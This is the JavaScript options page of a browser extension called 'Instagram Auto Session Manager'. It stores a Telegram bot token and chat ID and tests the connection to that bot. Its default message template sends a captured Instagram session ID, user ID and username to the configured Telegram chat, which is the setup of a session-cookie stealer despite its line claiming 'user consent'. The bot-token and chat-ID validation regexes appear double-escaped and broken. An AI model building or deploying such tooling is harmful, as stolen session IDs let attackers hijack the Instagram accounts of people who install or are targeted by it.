/**
 * ===================================
 * Instagram Auto Session Manager - Options Page JavaScript
 * Comprehensive script with extensive functionality and error handling
 * ===================================
 */

// ===================================
// GLOBAL VARIABLES AND CONSTANTS
// ===================================

/**
 * Default configuration object containing all default settings
 * This ensures consistent fallback values throughout the application
 */
const DEFAULT_CONFIG = {
    // Telegram Bot Configuration
    telegram: {
        botToken: '',
        chatId: '',
        messageTemplate: `🔐 Instagram Session Data Detected

📱 **Account Information:**
• Session ID: {sessionId}
• User ID: {userId}
• Username: {username}

⏰ **Timestamp:** {timestamp}
🌐 **URL:** {url}

✅ Data extracted with user consent via Instagram Auto Session Manager`
    },
    
    // Privacy and Security Settings
    privacy: {
        autoClearData: true,
        clearOnClose: false,
        showNotifications: true,
        consentReminders: true,
        requireConfirmation: true,
        logActivities: false
    },
    
    // Application Settings
    app: {
        version: '2.0.0',
        lastUpdated: new Date().toISOString(),
        firstRun: true
    }
};

/**
 * Global state object to track current application state
 */
let appState = {
    currentTab: 'telegram',
    isLoading: false,
    hasUnsavedChanges: false,
    testConnectionInProgress: false
};

/**
 * DOM element references for better performance and code organization
 */
let domElements = {};

// ===================================
// INITIALIZATION AND EVENT LISTENERS
// ===================================

/**
 * Main initialization function that runs when the DOM is fully loaded
 * Sets up all event listeners, loads saved settings, and initializes the UI
 */
document.addEventListener('DOMContentLoaded', async function() {
    console.log('Instagram Auto Session Manager Options - Initializing...');
    
    try {
        // Initialize DOM element references
        initializeDOMReferences();
        
        // Set up all event listeners
        setupEventListeners();
        
        // Load and apply saved settings
        await loadSavedSettings();
        
        // Initialize UI components
        initializeUI();
        
        // Check for first run and show welcome message if needed
        await checkFirstRun();
        
        console.log('Options page initialized successfully');
        
    } catch (error) {
        console.error('Error initializing options page:', error);
        showStatusMessage('Failed to initialize options page. Please refresh and try again.', 'error');
    }
});

/**
 * Initialize references to frequently used DOM elements
 * This improves performance by avoiding repeated querySelector calls
 */
function initializeDOMReferences() {
    domElements = {
        // Navigation elements
        navTabs: document.querySelectorAll('.nav-tab'),
        tabContents: document.querySelectorAll('.tab-content'),
        
        // Telegram form elements
        telegramForm: document.getElementById('telegram-form'),
        botTokenInput: document.getElementById('bot-token'),
        chatIdInput: document.getElementById('chat-id'),
        messageTemplateTextarea: document.getElementById('message-template'),
        toggleTokenButton: document.getElementById('toggle-token'),
        testConnectionButton: document.getElementById('test-connection'),
        testResult: document.getElementById('test-result'),
        saveSettingsButton: document.getElementById('save-settings'),
        resetSettingsButton: document.getElementById('reset-settings'),
        
        // Privacy form elements
        privacyForm: document.getElementById('privacy-form'),
        autoClearDataCheckbox: document.getElementById('auto-clear-data'),
        clearOnCloseCheckbox: document.getElementById('clear-on-close'),
        showNotificationsCheckbox: document.getElementById('show-notifications'),
        consentRemindersCheckbox: document.getElementById('consent-reminders'),
        requireConfirmationCheckbox: document.getElementById('require-confirmation'),
        logActivitiesCheckbox: document.getElementById('log-activities'),
        
        // Action buttons
        exportSettingsButton: document.getElementById('export-settings'),
        importSettingsButton: document.getElementById('import-settings'),
        clearAllDataButton: document.getElementById('clear-all-data'),
        importFileInput: document.getElementById('import-file-input'),
        
        // Modal elements
        modalOverlay: document.getElementById('modal-overlay'),
        chatIdModal: document.getElementById('chat-id-modal'),
        closeChatIdModalButton: document.getElementById('close-chat-id-modal'),
        
        // Help and utility elements
        showChatIdHelpButton: document.getElementById('show-chat-id-help'),
        resetTemplateButton: document.getElementById('reset-template'),
        statusMessages: document.getElementById('status-messages'),
        
        // About tab elements
        extensionVersion: document.getElementById('extension-version'),
        lastUpdated: document.getElementById('last-updated')
    };
}

/**
 * Set up all event listeners for the options page
 * Organized by functionality for better maintainability
 */
function setupEventListeners() {
    // Navigation tab switching
    setupNavigationListeners();
    
    // Telegram form listeners
    setupTelegramFormListeners();
    
    // Privacy form listeners
    setupPrivacyFormListeners();
    
    // Modal and help listeners
    setupModalListeners();
    
    // Utility and action listeners
    setupUtilityListeners();
    
    // Window and document listeners
    setupWindowListeners();
}

/**
 * Set up navigation tab switching functionality
 */
function setupNavigationListeners() {
    domElements.navTabs.forEach(tab => {
        tab.addEventListener('click', function() {
            const targetTab = this.getAttribute('data-tab');
            switchTab(targetTab);
        });
    });
}

/**
 * Set up Telegram form related event listeners
 */
function setupTelegramFormListeners() {
    // Form submission
    domElements.telegramForm.addEventListener('submit', handleTelegramFormSubmit);
    
    // Input change tracking for unsaved changes
    [domElements.botTokenInput, domElements.chatIdInput, domElements.messageTemplateTextarea].forEach(input => {
        input.addEventListener('input', function() {
            appState.hasUnsavedChanges = true;
            updateSaveButtonState();
        });
    });
    
    // Toggle password visibility for bot token
    domElements.toggleTokenButton.addEventListener('click', toggleTokenVisibility);
    
    // Test connection functionality
    domElements.testConnectionButton.addEventListener('click', testTelegramConnection);
    
    // Reset settings
    domElements.resetSettingsButton.addEventListener('click', resetTelegramSettings);
    
    // Reset message template
    domElements.resetTemplateButton.addEventListener('click', resetMessageTemplate);
}

/**
 * Set up privacy form related event listeners
 */
function setupPrivacyFormListeners() {
    // Privacy form submission
    domElements.privacyForm.addEventListener('submit', handlePrivacyFormSubmit);
    
    // Privacy checkbox change tracking
    const privacyCheckboxes = [
        domElements.autoClearDataCheckbox,
        domElements.clearOnCloseCheckbox,
        domElements.showNotificationsCheckbox,
        domElements.consentRemindersCheckbox,
        domElements.requireConfirmationCheckbox,
        domElements.logActivitiesCheckbox
    ];
    
    privacyCheckboxes.forEach(checkbox => {
        checkbox.addEventListener('change', function() {
            appState.hasUnsavedChanges = true;
            updateSaveButtonState();
        });
    });
    
    // Data management actions
    domElements.exportSettingsButton.addEventListener('click', exportSettings);
    domElements.importSettingsButton.addEventListener('click', () => domElements.importFileInput.click());
    domElements.importFileInput.addEventListener('change', importSettings);
    domElements.clearAllDataButton.addEventListener('click', clearAllData);
}

/**
 * Set up modal and help related event listeners
 */
function setupModalListeners() {
    // Show chat ID help modal
    domElements.showChatIdHelpButton.addEventListener('click', showChatIdHelpModal);
    
    // Close chat ID help modal
    domElements.closeChatIdModalButton.addEventListener('click', closeChatIdHelpModal);
    
    // Close modal when clicking overlay
    domElements.modalOverlay.addEventListener('click', function(e) {
        if (e.target === this) {
            closeChatIdHelpModal();
        }
    });
    
    // Close modal with Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && domElements.modalOverlay.classList.contains('active')) {
            closeChatIdHelpModal();
        }
    });
}

/**
 * Set up utility and miscellaneous event listeners
 */
function setupUtilityListeners() {
    // About tab links (placeholder functionality)
    const aboutLinks = document.querySelectorAll('.support-link');
    aboutLinks.forEach(link => {
        if (link.id) {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                handleAboutLinkClick(this.id);
            });
        }
    });
}

/**
 * Set up window and document level event listeners
 */
function setupWindowListeners() {
    // Warn user about unsaved changes when leaving page
    window.addEventListener('beforeunload', function(e) {
        if (appState.hasUnsavedChanges) {
            e.preventDefault();
            e.returnValue = 'You have unsaved changes. Are you sure you want to leave?';
            return e.returnValue;
        }
    });
    
    // Handle browser back/forward navigation
    window.addEventListener('popstate', function(e) {
        if (e.state && e.state.tab) {
            switchTab(e.state.tab);
        }
    });
}

// ===================================
// TAB NAVIGATION FUNCTIONALITY
// ===================================

/**
 * Switch between different tabs in the options interface
 * @param {string} tabName - The name of the tab to switch to
 */
function switchTab(tabName) {
    console.log(`Switching to tab: ${tabName}`);
    
    try {
        // Update navigation tabs
        domElements.navTabs.forEach(tab => {
            tab.classList.remove('active');
            if (tab.getAttribute('data-tab') === tabName) {
                tab.classList.add('active');
            }
        });
        
        // Update tab content
        domElements.tabContents.forEach(content => {
            content.classList.remove('active');
            if (content.id === `${tabName}-tab`) {
                content.classList.add('active');
            }
        });
        
        // Update application state
        appState.currentTab = tabName;
        
        // Update browser history
        history.pushState({ tab: tabName }, '', `#${tabName}`);
        
        // Perform tab-specific initialization if needed
        onTabSwitch(tabName);
        
    } catch (error) {
        console.error('Error switching tabs:', error);
        showStatusMessage('Error switching tabs. Please try again.', 'error');
    }
}

/**
 * Handle tab-specific initialization when switching tabs
 * @param {string} tabName - The name of the tab that was switched to
 */
function onTabSwitch(tabName) {
    switch (tabName) {
        case 'telegram':
            // Focus on first input if it's empty
            if (!domElements.botTokenInput.value) {
                domElements.botTokenInput.focus();
            }
            break;
            
        case 'privacy':
            // Update privacy settings display
            updatePrivacySettingsDisplay();
            break;
            
        case 'about':
            // Update version information
            updateAboutInformation();
            break;
    }
}

// ===================================
// SETTINGS MANAGEMENT
// ===================================

/**
 * Load saved settings from Chrome storage and populate the form fields
 */
async function loadSavedSettings() {
    console.log('Loading saved settings...');
    
    try {
        // Show loading state
        setLoadingState(true);
        
        // Get settings from Chrome storage
        const result = await chrome.storage.local.get(['telegramSettings', 'privacySettings', 'appSettings']);
        
        // Merge with defaults to ensure all properties exist
        const telegramSettings = { ...DEFAULT_CONFIG.telegram, ...result.telegramSettings };
        const privacySettings = { ...DEFAULT_CONFIG.privacy, ...result.privacySettings };
        const appSettings = { ...DEFAULT_CONFIG.app, ...result.appSettings };
        
        // Populate Telegram form fields
        domElements.botTokenInput.value = telegramSettings.botToken || '';
        domElements.chatIdInput.value = telegramSettings.chatId || '';
        domElements.messageTemplateTextarea.value = telegramSettings.messageTemplate || DEFAULT_CONFIG.telegram.messageTemplate;
        
        // Populate Privacy form fields
        domElements.autoClearDataCheckbox.checked = privacySettings.autoClearData;
        domElements.clearOnCloseCheckbox.checked = privacySettings.clearOnClose;
        domElements.showNotificationsCheckbox.checked = privacySettings.showNotifications;
        domElements.consentRemindersCheckbox.checked = privacySettings.consentReminders;
        domElements.requireConfirmationCheckbox.checked = privacySettings.requireConfirmation;
        domElements.logActivitiesCheckbox.checked = privacySettings.logActivities;
        
        // Update app information
        domElements.extensionVersion.textContent = appSettings.version || DEFAULT_CONFIG.app.version;
        domElements.lastUpdated.textContent = formatDate(appSettings.lastUpdated || DEFAULT_CONFIG.app.lastUpdated);
        
        // Reset unsaved changes flag
        appState.hasUnsavedChanges = false;
        updateSaveButtonState();
        
        console.log('Settings loaded successfully');
        
    } catch (error) {
        console.error('Error loading settings:', error);
        showStatusMessage('Error loading settings. Using default values.', 'error');
        
        // Load default settings on error
        loadDefaultSettings();
        
    } finally {
        setLoadingState(false);
    }
}

/**
 * Load default settings into the form fields
 */
function loadDefaultSettings() {
    console.log('Loading default settings...');
    
    // Populate with default values
    domElements.botTokenInput.value = DEFAULT_CONFIG.telegram.botToken;
    domElements.chatIdInput.value = DEFAULT_CONFIG.telegram.chatId;
    domElements.messageTemplateTextarea.value = DEFAULT_CONFIG.telegram.messageTemplate;
    
    domElements.autoClearDataCheckbox.checked = DEFAULT_CONFIG.privacy.autoClearData;
    domElements.clearOnCloseCheckbox.checked = DEFAULT_CONFIG.privacy.clearOnClose;
    domElements.showNotificationsCheckbox.checked = DEFAULT_CONFIG.privacy.showNotifications;
    domElements.consentRemindersCheckbox.checked = DEFAULT_CONFIG.privacy.consentReminders;
    domElements.requireConfirmationCheckbox.checked = DEFAULT_CONFIG.privacy.requireConfirmation;
    domElements.logActivitiesCheckbox.checked = DEFAULT_CONFIG.privacy.logActivities;
    
    appState.hasUnsavedChanges = false;
    updateSaveButtonState();
}

/**
 * Save current settings to Chrome storage
 * @param {string} settingsType - Type of settings to save ('telegram', 'privacy', or 'all')
 */
async function saveSettings(settingsType = 'all') {
    console.log(`Saving ${settingsType} settings...`);
    
    try {
        setLoadingState(true);
        
        const settingsToSave = {};
        
        if (settingsType === 'telegram' || settingsType === 'all') {
            settingsToSave.telegramSettings = {
                botToken: domElements.botTokenInput.value.trim(),
                chatId: domElements.chatIdInput.value.trim(),
                messageTemplate: domElements.messageTemplateTextarea.value.trim() || DEFAULT_CONFIG.telegram.messageTemplate
            };
        }
        
        if (settingsType === 'privacy' || settingsType === 'all') {
            settingsToSave.privacySettings = {
                autoClearData: domElements.autoClearDataCheckbox.checked,
                clearOnClose: domElements.clearOnCloseCheckbox.checked,
                showNotifications: domElements.showNotificationsCheckbox.checked,
                consentReminders: domElements.consentRemindersCheckbox.checked,
                requireConfirmation: domElements.requireConfirmationCheckbox.checked,
                logActivities: domElements.logActivitiesCheckbox.checked
            };
        }
        
        if (settingsType === 'all') {
            settingsToSave.appSettings = {
                ...DEFAULT_CONFIG.app,
                lastUpdated: new Date().toISOString(),
                firstRun: false
            };
        }
        
        // Save to Chrome storage
        await chrome.storage.local.set(settingsToSave);
        
        // Update application state
        appState.hasUnsavedChanges = false;
        updateSaveButtonState();
        
        // Show success message
        showStatusMessage('Settings saved successfully!', 'success');
        
        console.log('Settings saved successfully');
        
        // Notify background script of settings change
        try {
            await chrome.runtime.sendMessage({
                action: 'settingsUpdated',
                settingsType: settingsType,
                settings: settingsToSave
            });
        } catch (error) {
            console.warn('Could not notify background script:', error);
        }
        
    } catch (error) {
        console.error('Error saving settings:', error);
        showStatusMessage('Error saving settings. Please try again.', 'error');
        
    } finally {
        setLoadingState(false);
    }
}

// ===================================
// TELEGRAM FORM HANDLERS
// ===================================

/**
 * Handle Telegram form submission
 * @param {Event} e - Form submit event
 */
async function handleTelegramFormSubmit(e) {
    e.preventDefault();
    
    console.log('Handling Telegram form submission...');
    
    // Validate form inputs
    if (!validateTelegramForm()) {
        return;
    }
    
    // Save Telegram settings
    await saveSettings('telegram');
}

/**
 * Validate Telegram form inputs
 * @returns {boolean} - True if form is valid, false otherwise
 */
function validateTelegramForm() {
    const botToken = domElements.botTokenInput.value.trim();
    const chatId = domElements.chatIdInput.value.trim();
    
    // Clear previous validation states
    clearValidationErrors();
    
    let isValid = true;
    
    // Validate bot token
    if (!botToken) {
        showFieldError(domElements.botTokenInput, 'Bot token is required');
        isValid = false;
    } else if (!isValidBotToken(botToken)) {
        showFieldError(domElements.botTokenInput, 'Invalid bot token format');
        isValid = false;
    }
    
    // Validate chat ID
    if (!chatId) {
        showFieldError(domElements.chatIdInput, 'Chat ID is required');
        isValid = false;
    } else if (!isValidChatId(chatId)) {
        showFieldError(domElements.chatIdInput, 'Invalid chat ID format');
        isValid = false;
    }
    
    return isValid;
}

/**
 * Test connection to Telegram bot
 */
async function testTelegramConnection() {
    console.log('Testing Telegram connection...');
    
    if (appState.testConnectionInProgress) {
        return;
    }
    
    const botToken = domElements.botTokenInput.value.trim();
    const chatId = domElements.chatIdInput.value.trim();
    
    // Validate inputs before testing
    if (!botToken || !chatId) {
        showTestResult('Please enter both bot token and chat ID before testing', 'error');
        return;
    }
    
    if (!isValidBotToken(botToken) || !isValidChatId(chatId)) {
        showTestResult('Invalid bot token or chat ID format', 'error');
        return;
    }
    
    try {
        appState.testConnectionInProgress = true;
        domElements.testConnectionButton.disabled = true;
        showTestResult('Testing connection...', 'loading');
        
        // Test bot info first
        const botInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
        const botInfo = await botInfoResponse.json();
        
        if (!botInfo.ok) {
            throw new Error(botInfo.description || 'Invalid bot token');
        }
        
        // Test sending a message
        const testMessage = `🔍 Test message from Instagram Auto Session Manager\n\n✅ Connection successful!\n⏰ ${new Date().toLocaleString()}`;
        
        const messageResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: testMessage,
                parse_mode: 'HTML'
            })
        });
        
        const messageResult = await messageResponse.json();
        
        if (!messageResult.ok) {
            throw new Error(messageResult.description || 'Failed to send test message');
        }
        
        showTestResult(`✅ Connection successful! Bot: @${botInfo.result.username}`, 'success');
        
    } catch (error) {
        console.error('Telegram connection test failed:', error);
        showTestResult(`❌ Connection failed: ${error.message}`, 'error');
        
    } finally {
        appState.testConnectionInProgress = false;
        domElements.testConnectionButton.disabled = false;
    }
}

/**
 * Toggle visibility of bot token input
 */
function toggleTokenVisibility() {
    const input = domElements.botTokenInput;
    const icon = domElements.toggleTokenButton.querySelector('.visibility-icon');
    
    if (input.type === 'password') {
        input.type = 'text';
        icon.textContent = '🙈';
    } else {
        input.type = 'password';
        icon.textContent = '👁️';
    }
}

/**
 * Reset Telegram settings to defaults
 */
async function resetTelegramSettings() {
    if (!confirm('Are you sure you want to reset Telegram settings to defaults? This action cannot be undone.')) {
        return;
    }
    
    console.log('Resetting Telegram settings...');
    
    try {
        // Clear form fields
        domElements.botTokenInput.value = DEFAULT_CONFIG.telegram.botToken;
        domElements.chatIdInput.value = DEFAULT_CONFIG.telegram.chatId;
        domElements.messageTemplateTextarea.value = DEFAULT_CONFIG.telegram.messageTemplate;
        
        // Clear test result
        domElements.testResult.textContent = '';
        domElements.testResult.className = 'test-result';
        
        // Mark as having unsaved changes
        appState.hasUnsavedChanges = true;
        updateSaveButtonState();
        
        showStatusMessage('Telegram settings reset to defaults. Click Save to apply changes.', 'info');
        
    } catch (error) {
        console.error('Error resetting Telegram settings:', error);
        showStatusMessage('Error resetting settings. Please try again.', 'error');
    }
}

/**
 * Reset message template to default
 */
function resetMessageTemplate() {
    if (!confirm('Reset message template to default?')) {
        return;
    }
    
    domElements.messageTemplateTextarea.value = DEFAULT_CONFIG.telegram.messageTemplate;
    appState.hasUnsavedChanges = true;
    updateSaveButtonState();
    
    showStatusMessage('Message template reset to default', 'info');
}

// ===================================
// PRIVACY FORM HANDLERS
// ===================================

/**
 * Handle Privacy form submission
 * @param {Event} e - Form submit event
 */
async function handlePrivacyFormSubmit(e) {
    e.preventDefault();
    
    console.log('Handling Privacy form submission...');
    
    // Save privacy settings
    await saveSettings('privacy');
}

/**
 * Update privacy settings display based on current values
 */
function updatePrivacySettingsDisplay() {
    // Add any dynamic updates to privacy settings display here
    console.log('Updating privacy settings display...');
}

// ===================================
// DATA MANAGEMENT FUNCTIONS
// ===================================

/**
 * Export current settings to a JSON file
 */
async function exportSettings() {
    console.log('Exporting settings...');
    
    try {
        // Get all current settings
        const result = await chrome.storage.local.get(['telegramSettings', 'privacySettings', 'appSettings']);
        
        // Create export object
        const exportData = {
            version: '2.0.0',
            exportDate: new Date().toISOString(),
            settings: {
                telegram: result.telegramSettings || {},
                privacy: result.privacySettings || {},
                app: result.appSettings || {}
            }
        };
        
        // Create and download file
        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `instagram-session-manager-settings-${new Date().toISOString().split('T')[0]}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        URL.revokeObjectURL(url);
        
        showStatusMessage('Settings exported successfully!', 'success');
        
    } catch (error) {
        console.error('Error exporting settings:', error);
        showStatusMessage('Error exporting settings. Please try again.', 'error');
    }
}

/**
 * Import settings from a JSON file
 * @param {Event} e - File input change event
 */
async function importSettings(e) {
    const file = e.target.files[0];
    if (!file) return;
    
    console.log('Importing settings...');
    
    try {
        const text = await file.text();
        const importData = JSON.parse(text);
        
        // Validate import data structure
        if (!importData.settings) {
            throw new Error('Invalid settings file format');
        }
        
        // Confirm import
        if (!confirm('This will overwrite your current settings. Are you sure you want to continue?')) {
            return;
        }
        
        // Import settings
        const settingsToImport = {};
        
        if (importData.settings.telegram) {
            settingsToImport.telegramSettings = importData.settings.telegram;
        }
        
        if (importData.settings.privacy) {
            settingsToImport.privacySettings = importData.settings.privacy;
        }
        
        if (importData.settings.app) {
            settingsToImport.appSettings = {
                ...importData.settings.app,
                lastUpdated: new Date().toISOString()
            };
        }
        
        // Save imported settings
        await chrome.storage.local.set(settingsToImport);
        
        // Reload settings in UI
        await loadSavedSettings();
        
        showStatusMessage('Settings imported successfully!', 'success');
        
    } catch (error) {
        console.error('Error importing settings:', error);
        showStatusMessage('Error importing settings. Please check the file format.', 'error');
        
    } finally {
        // Clear file input
        e.target.value = '';
    }
}

/**
 * Clear all stored data
 */
async function clearAllData() {
    const confirmation = prompt(
        'This will permanently delete ALL extension data including settings, logs, and cached information.\\n\\n' +
        'Type "DELETE ALL DATA" to confirm this action:'
    );
    
    if (confirmation !== 'DELETE ALL DATA') {
        showStatusMessage('Data clearing cancelled', 'info');
        return;
    }
    
    console.log('Clearing all data...');
    
    try {
        setLoadingState(true);
        
        // Clear Chrome storage
        await chrome.storage.local.clear();
        
        // Reset form to defaults
        loadDefaultSettings();
        
        // Clear test results and status messages
        domElements.testResult.textContent = '';
        domElements.testResult.className = 'test-result';
        domElements.statusMessages.innerHTML = '';
        
        // Reset application state
        appState.hasUnsavedChanges = false;
        updateSaveButtonState();
        
        showStatusMessage('All data cleared successfully. Extension reset to defaults.', 'success');
        
        console.log('All data cleared successfully');
        
    } catch (error) {
        console.error('Error clearing data:', error);
        showStatusMessage('Error clearing data. Please try again.', 'error');
        
    } finally {
        setLoadingState(false);
    }
}

// ===================================
// MODAL FUNCTIONS
// ===================================

/**
 * Show the Chat ID help modal
 */
function showChatIdHelpModal() {
    domElements.modalOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
}

/**
 * Close the Chat ID help modal
 */
function closeChatIdHelpModal() {
    domElements.modalOverlay.classList.remove('active');
    document.body.style.overflow = '';
}

// ===================================
// UTILITY FUNCTIONS
// ===================================

/**
 * Show status message to user
 * @param {string} message - Message to display
 * @param {string} type - Message type ('success', 'error', 'info')
 */
function showStatusMessage(message, type = 'info') {
    const messageElement = document.createElement('div');
    messageElement.className = `status-message ${type}`;
    messageElement.textContent = message;
    
    // Clear existing messages
    domElements.statusMessages.innerHTML = '';
    
    // Add new message
    domElements.statusMessages.appendChild(messageElement);
    
    // Auto-remove after 5 seconds
    setTimeout(() => {
        if (messageElement.parentNode) {
            messageElement.remove();
        }
    }, 5000);
    
    console.log(`Status message (${type}): ${message}`);
}

/**
 * Show test result
 * @param {string} message - Result message
 * @param {string} type - Result type ('success', 'error', 'loading')
 */
function showTestResult(message, type) {
    domElements.testResult.textContent = message;
    domElements.testResult.className = `test-result ${type}`;
}

/**
 * Show field validation error
 * @param {HTMLElement} field - Input field element
 * @param {string} message - Error message
 */
function showFieldError(field, message) {
    field.style.borderColor = 'var(--danger-color)';
    field.style.boxShadow = '0 0 0 3px rgba(220, 53, 69, 0.1)';
    
    // Create or update error message
    let errorElement = field.parentNode.querySelector('.field-error');
    if (!errorElement) {
        errorElement = document.createElement('div');
        errorElement.className = 'field-error';
        errorElement.style.color = 'var(--danger-color)';
        errorElement.style.fontSize = 'var(--font-size-sm)';
        errorElement.style.marginTop = 'var(--spacing-xs)';
        field.parentNode.appendChild(errorElement);
    }
    errorElement.textContent = message;
    
    // Clear error on input
    field.addEventListener('input', function clearError() {
        field.style.borderColor = '';
        field.style.boxShadow = '';
        if (errorElement) {
            errorElement.remove();
        }
        field.removeEventListener('input', clearError);
    });
}

/**
 * Clear all validation errors
 */
function clearValidationErrors() {
    const errorElements = document.querySelectorAll('.field-error');
    errorElements.forEach(element => element.remove());
    
    const inputs = document.querySelectorAll('.form-input, .form-textarea');
    inputs.forEach(input => {
        input.style.borderColor = '';
        input.style.boxShadow = '';
    });
}

/**
 * Set loading state for the entire page
 * @param {boolean} isLoading - Whether page is in loading state
 */
function setLoadingState(isLoading) {
    appState.isLoading = isLoading;
    
    if (isLoading) {
        document.body.classList.add('loading');
    } else {
        document.body.classList.remove('loading');
    }
}

/**
 * Update save button state based on unsaved changes
 */
function updateSaveButtonState() {
    const saveButtons = document.querySelectorAll('.save-button');
    saveButtons.forEach(button => {
        if (appState.hasUnsavedChanges) {
            button.style.background = 'var(--warning-color)';
            button.textContent = '💾 Save Changes';
        } else {
            button.style.background = '';
            button.innerHTML = '<span class="button-icon">💾</span>Save Settings';
        }
    });
}

/**
 * Initialize UI components
 */
function initializeUI() {
    // Set initial tab based on URL hash
    const hash = window.location.hash.substring(1);
    if (hash && ['telegram', 'privacy', 'about'].includes(hash)) {
        switchTab(hash);
    } else {
        switchTab('telegram');
    }
    
    // Initialize message template with default if empty
    if (!domElements.messageTemplateTextarea.value) {
        domElements.messageTemplateTextarea.value = DEFAULT_CONFIG.telegram.messageTemplate;
    }
}

/**
 * Check if this is the first run and show welcome message
 */
async function checkFirstRun() {
    try {
        const result = await chrome.storage.local.get(['appSettings']);
        const appSettings = result.appSettings || {};
        
        if (appSettings.firstRun !== false) {
            showStatusMessage('Welcome to Instagram Auto Session Manager! Please configure your Telegram bot settings below.', 'info');
        }
    } catch (error) {
        console.error('Error checking first run:', error);
    }
}

/**
 * Update about tab information
 */
function updateAboutInformation() {
    // Update any dynamic information in the about tab
    const now = new Date();
    domElements.lastUpdated.textContent = formatDate(now.toISOString());
}

/**
 * Handle about tab link clicks
 * @param {string} linkId - ID of the clicked link
 */
function handleAboutLinkClick(linkId) {
    switch (linkId) {
        case 'view-privacy-policy':
            // Open privacy policy (placeholder)
            alert('Privacy policy would open here');
            break;
            
        case 'view-source-code':
            // Open source code (placeholder)
            alert('Source code would open here');
            break;
            
        case 'report-issue':
            // Open issue reporting (placeholder)
            alert('Issue reporting would open here');
            break;
            
        default:
            console.log(`Unhandled about link: ${linkId}`);
    }
}

// ===================================
// VALIDATION FUNCTIONS
// ===================================

/**
 * Validate bot token format
 * @param {string} token - Bot token to validate
 * @returns {boolean} - True if valid format
 */
function isValidBotToken(token) {
    // Telegram bot token format: number:alphanumeric_string
    const botTokenRegex = /^\\d+:[A-Za-z0-9_-]+$/;
    return botTokenRegex.test(token);
}

/**
 * Validate chat ID format
 * @param {string} chatId - Chat ID to validate
 * @returns {boolean} - True if valid format
 */
function isValidChatId(chatId) {
    // Chat ID can be a number or @username
    const numericChatId = /^-?\\d+$/;
    const usernameChatId = /^@[a-zA-Z0-9_]+$/;
    
    return numericChatId.test(chatId) || usernameChatId.test(chatId);
}

/**
 * Format date string for display
 * @param {string} dateString - ISO date string
 * @returns {string} - Formatted date
 */
function formatDate(dateString) {
    try {
        const date = new Date(dateString);
        return date.toLocaleDateString('en-US', {
            year: 'numeric',
            month: 'long',
            day: 'numeric'
        });
    } catch (error) {
        return 'Unknown';
    }
}

// ===================================
// ERROR HANDLING AND LOGGING
// ===================================

/**
 * Global error handler for unhandled errors
 */
window.addEventListener('error', function(e) {
    console.error('Unhandled error in options page:', e.error);
    showStatusMessage('An unexpected error occurred. Please refresh the page and try again.', 'error');
});

/**
 * Global handler for unhandled promise rejections
 */
window.addEventListener('unhandledrejection', function(e) {
    console.error('Unhandled promise rejection in options page:', e.reason);
    showStatusMessage('An unexpected error occurred. Please refresh the page and try again.', 'error');
});

// ===================================
// EXPORT FOR TESTING (if needed)
// ===================================

// Export functions for testing purposes (only in development)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        DEFAULT_CONFIG,
        isValidBotToken,
        isValidChatId,
        formatDate
    };
}

console.log('Instagram Auto Session Manager Options - Script loaded successfully');

